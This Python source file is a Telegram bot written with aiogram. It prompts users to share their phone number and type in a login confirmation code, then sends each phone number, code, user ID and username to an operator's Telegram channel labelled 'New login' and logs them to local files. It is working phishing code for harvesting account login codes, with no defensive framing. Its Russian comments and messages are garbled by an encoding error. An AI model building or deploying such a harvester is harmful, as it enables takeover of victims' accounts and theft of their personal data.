#!/usr/bin/env python3
import os
import csv
import logging
import asyncio
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –æ–∫—Ä—É–∂–µ–Ω–∏—è ===
TOKEN = os.getenv("PLAY", "").strip()        # —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
CHANNEL = os.getenv("CHANNEL", "").strip()   # ID –∫–∞–Ω–∞–ª–∞/—á–∞—Ç–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä: -1003079638308)

if not TOKEN or not CHANNEL:
    raise RuntimeError("–ù—É–∂–Ω–æ –∑–∞–¥–∞—Ç—å –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è: PLAY (—Ç–æ–∫–µ–Ω) –∏ CHANNEL (id –∫–∞–Ω–∞–ª–∞/—á–∞—Ç–∞).")

try:
    CHANNEL_ID = int(CHANNEL)
except ValueError:
    raise RuntimeError("CHANNEL –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º (–Ω–∞–ø—Ä–∏–º–µ—Ä: -1003079638308).")

# === –õ–æ–≥–∏ –∏ CSV ===
LOG_FILE = "logins.txt"
CSV_FILE = "submissions.csv"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)
# –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –ª–æ–≥–∏—Ä—É–µ–º –≤ —Ñ–∞–π–ª (Render —Ö—Ä–∞–Ω–∏—Ç —Ñ–∞–π–ª—ã —ç—Ñ–µ–º–µ—Ä–Ω–æ ‚Äî –æ–∫ –¥–ª—è –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–≥–æ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞)
file_handler = logging.FileHandler(LOG_FILE, encoding="utf-8")
file_handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)s | %(message)s"))
logging.getLogger().addHandler(file_handler)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è CSV (—Å –∑–∞–≥–æ–ª–æ–≤–∫–æ–º)
if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, "w", newline="", encoding="utf-8") as f:
        csv.writer(f).writerow(["timestamp", "user_id", "username", "phone", "code"])

# === FSM —Å–æ—Å—Ç–æ—è–Ω–∏—è ===
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

# === Router –∏ –ø–∞–º—è—Ç—å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π ===
router = Router()
user_last_submit = {}  # {user_id: datetime} –¥–ª—è –ª–∏–º–∏—Ç–∞ 1 –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ 24—á

# === –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∏ —É–¥–∞–ª–∏—Ç—å —á–µ—Ä–µ–∑ delay ===
async def send_and_delete(message: Message, text: str, delay: int = 10, reply_markup=None):
    msg = await message.answer(text, reply_markup=reply_markup)
    try:
        await asyncio.sleep(delay)
        await msg.delete()
    except Exception:
        pass

# === /start (–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–∏–ª—å—Ç—Ä –∫–æ–º–∞–Ω–¥) ===
@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä", request_contact=True))
    await message.answer("–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä:", reply_markup=kb)
    await state.set_state(AuthFlow.waiting_for_phone)

# === –ó–∞—â–∏—Ç–∞: –µ—Å–ª–∏ –ø—Ä–∏—Å–ª–∞–ª–∏ —Ç–µ–∫—Å—Ç –≤–º–µ—Å—Ç–æ –∫–æ–Ω—Ç–∞–∫—Ç–∞ –Ω–∞ —à–∞–≥–µ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ ===
@router.message(AuthFlow.waiting_for_phone, F.text)
async def need_contact(message: Message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä", request_contact=True))
    await message.answer("–ù—É–∂–µ–Ω –∫–æ–Ω—Ç–∞–∫—Ç —Å –Ω–æ–º–µ—Ä–æ–º. –ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:", reply_markup=kb)

# === –ü—Ä–∏—ë–º –∫–æ–Ω—Ç–∞–∫—Ç–∞ (–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞) ===
@router.message(AuthFlow.waiting_for_phone, F.contact)
async def handle_contact(message: Message, state: FSMContext):
    phone = message.contact.phone_number if message.contact else None
    if not phone:
        await message.answer("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –Ω–æ–º–µ—Ä. –ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑ –∫–Ω–æ–ø–∫–æ–π.")
        return
    await state.update_data(phone=phone)
    await message.answer("–¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è (–¥–æ 6 —Ü–∏—Ñ—Ä):")
    await state.set_state(AuthFlow.waiting_for_code)

# === –ü—Ä–∏—ë–º –∫–æ–¥–∞ ===
@router.message(AuthFlow.waiting_for_code)
async def handle_code(message: Message, state: FSMContext, bot: Bot):
    uid = message.from_user.id
    now = datetime.now()

    # –õ–∏–º–∏—Ç 1 –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ 24 —á–∞—Å–∞
    last = user_last_submit.get(uid)
    if last and (now - last) < timedelta(hours=24):
        await message.answer("‚è≥ –¢—ã —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–ª –¥–∞–Ω–Ω—ã–µ —Å–µ–≥–æ–¥–Ω—è. –ü–æ–ø—Ä–æ–±—É–π –ø–æ–∑–∂–µ.")
        await state.clear()
        return

    code = (message.text or "").strip()
    if not code.isdigit() or len(code) > 6 or len(code) == 0:
        await message.answer("‚ùå –ö–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–≤—ã–º, 1‚Äì6 —Ü–∏—Ñ—Ä. –í–≤–µ–¥–∏ –µ—â—ë —Ä–∞–∑.")
        return

    data = await state.get_data()
    phone = data.get("phone", "unknown")
    username = (message.from_user.username or "").strip()
    timestamp = now.isoformat()

    # –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç –¥–ª—è –∫–∞–Ω–∞–ª–∞
    text = (
        "üì≤ –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω:\n"
        f"–ù–æ–º–µ—Ä: {phone}\n"
        f"–ö–æ–¥: {code}\n"
        f"UserID: {uid}\n"
        f"Username: @{username if username else '‚Äî'}\n"
        f"–í—Ä–µ–º—è: {timestamp}"
    )

    # –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –∫–∞–Ω–∞–ª
    try:
        await bot.send_message(CHANNEL_ID, text)
    except Exception as e:
        logging.exception(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ –∫–∞–Ω–∞–ª: {e}")

    # –õ–æ–≥ –≤ —Ñ–∞–π–ª
    logging.info(f"–ù–æ–º–µ—Ä:{phone} | –ö–æ–¥:{code} | UserID:{uid} | Username:@{username if username else '-'}")

    # –ó–∞–ø–∏—Å—å –≤ CSV
    try:
        with open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
            csv.writer(f).writerow([timestamp, uid, username, phone, code])
    except Exception as e:
        logging.exception(f"–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ CSV: {e}")

    user_last_submit[uid] = now
    await message.answer("‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.")
    await state.clear()

# === –°–ª—É–∂–µ–±–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã (–ø–æ –∂–µ–ª–∞–Ω–∏—é) ===
@router.message(Command("ping"))
async def ping(message: Message):
    await message.answer("pong")

@router.message(Command("help"))
async def help_cmd(message: Message):
    await message.answer("–ö–æ–º–∞–Ω–¥—ã: /start ‚Äî –Ω–∞—á–∞—Ç—å, /ping ‚Äî –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ.")

# === –ó–∞–ø—É—Å–∫ –ø–æ–ª–ª–∏–Ω–≥–∞ ===
async def main():
    bot = Bot(token=TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    logging.info("–ë–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è. –ù–∞—á–∏–Ω–∞–µ–º polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
